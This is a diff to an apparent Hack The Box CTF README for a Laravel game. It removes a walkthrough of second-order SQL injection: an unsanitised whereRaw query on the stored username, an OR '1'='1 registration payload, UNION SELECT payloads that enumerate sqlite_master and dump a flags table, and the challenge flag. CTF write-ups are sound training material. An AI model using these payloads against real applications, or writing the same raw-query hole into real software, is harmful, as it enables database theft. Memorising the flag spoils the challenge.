@@ -9,80 +9,17 @@ This challenge showcases how dangerous unsanitized data persistence can be — e
 
 ---
 
+##Code
+
+Since this CTF has been submitted to Hack The Box, I’m unable to share the code publicly.
+
+---
+
 ## 🚀 Environment
 
 - **Framework:** Laravel + [Octane](https://laravel.com/docs/octane) (FrankenPHP backend)
 - **Containerization:** [Laravel Sail](https://laravel.com/docs/sail) for Dockerized deployment
 - **Dependencies:** Managed via Composer and Node — initialized through `./vendor/bin/sail`
-
----
-
-## 🕵️‍♂️ Challenge Summary
-
-In version 2 of the game, a raw query uses the logged-in user’s **`name`** directly in SQL:
-
-```php
-Game::whereRaw("user_name = '{user->name}'")->get();
-```
-
-Since usernames are stored during registration, malicious input can be saved and **executed later** — leading to a **second-order SQL injection**.  
-Automated tools like `sqlmap` often miss this because payloads are interpreted in a later context.
-
----
-
-## 🔍 Exploitation Walkthrough
-
-### 1. Registration Payload
-
-Register with a crafted username:
-
-```
-name' OR '1'='1
-```
-
-### 2. Trigger Injection
-
-Access the vulnerable endpoint:
-
-```
-GET /games/history
-```
-
-If successful, the app returns SQL errors or injected results.
-
-### 3. Union Enumeration
-
-Find the correct column count:
-
-```
-username' UNION SELECT 1,2,3,4,5,6,7,8-- -
-```
-
-Identify a text column with:
-
-```
-username' UNION SELECT 1,2,3,sqlite_version(),5,6,7,8-- -
-```
-
-List tables:
-
-```
-username' UNION SELECT 1,2,3,name,5,6,7,8 FROM sqlite_master WHERE type='table'-- -
-```
-
-Dump the flag:
-
-```
-username' UNION SELECT id,2,3,value,5,6,7,8 FROM flags-- -
-```
-
-Response:
-
-```json
-{
-  "result": "HTB{ThE_GuEss_ROyAl_MAstEr}"
-}
-```
 
 ---
 
